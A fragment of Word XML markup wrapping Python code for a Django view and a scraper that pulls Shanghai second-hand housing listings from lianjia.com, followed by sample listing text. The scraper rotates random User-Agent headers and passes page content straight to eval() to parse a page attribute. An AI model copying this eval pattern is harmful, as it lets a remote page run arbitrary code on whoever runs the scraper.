        </w:rPr>
        <w:t>import re</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A6CE9B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BBACAE8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># Create your views here.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6045A81D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A42BDC0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def house_spider(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BF6D01" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    if request.method == 'POST':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3395E5ED" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        form = HouseChoiceForm(request.POST)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B6A0BDE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if form.is_valid():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65187FB9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            district = form.cleaned_data.get('district')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38EF95C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            price = form.cleaned_data.get('price')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6818A598" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            bedroom = form.cleaned_data.get('bedroom')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7B4AD3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            url = 'https://sh.lianjia.com/ershoufang/{}/{}{}'.format(district, price, bedroom)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D214771" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AA3DED7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            home_spider = HomeLinkSpider(url)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1917866E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            home_spider.get_max_page()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5809017A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            home_spider.parse_page()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175723EA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            home_spider.save_data_to_model()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B316EEB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return HttpResponseRedirect('/homelink/')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7781DA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF0BEBC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return HttpResponseRedirect('/homelink/')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F8DED8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E2A6B73" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class HomeLinkSpider(object):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1725E1F8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, url):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6616A2A4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.ua = UserAgent()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42CF53B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.headers = {"User-Agent": self.ua.random}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496074AC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.data = list()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120CB828" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.url = url</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA54593" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EBFF588" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def get_max_page(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0883BC9A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        response = requests.get(self.url, headers=self.headers)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3418A4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        if response.status_code == 200:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390DF4B6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            soup = BeautifulSoup(response.text, 'html.parser')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="125D80D8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            a = soup.select('div[class="page-box house-lst-page-box"]')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBDA590" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            max_page = eval(a[0].attrs["page-data"])["totalPage"] # </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>是字符串转化为字典格式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0783F0AB"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return max_page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B0C733" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A942AE5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6614391B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="113BF5F1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def parse_page(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504E7907" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        max_page = self.get_max_page()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42F91361" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        for i in range(1, max_page + 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D34F64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            url = "{}pg{}/".format(self.url, i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B026162" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            response = requests.get(url, headers=self.headers)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF2BA1B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            soup = BeautifulSoup(response.text, 'html.parser')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F6D1F7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            ul = soup.find_all("ul", class_="sellListContent")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7BA7DB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            li_list = ul[0].select("li")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0FE270" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            for li in li_list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34450817" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail = dict()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552F4AA7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">                detail['title'] = li.select('div[class="title"]')[0].get_text()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AF98EFA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CFD8DA7"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大华锦绣华城</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>九街区</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)  | 3</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>室</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>厅</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> | 76.9</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>平米</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>南</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>其他</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
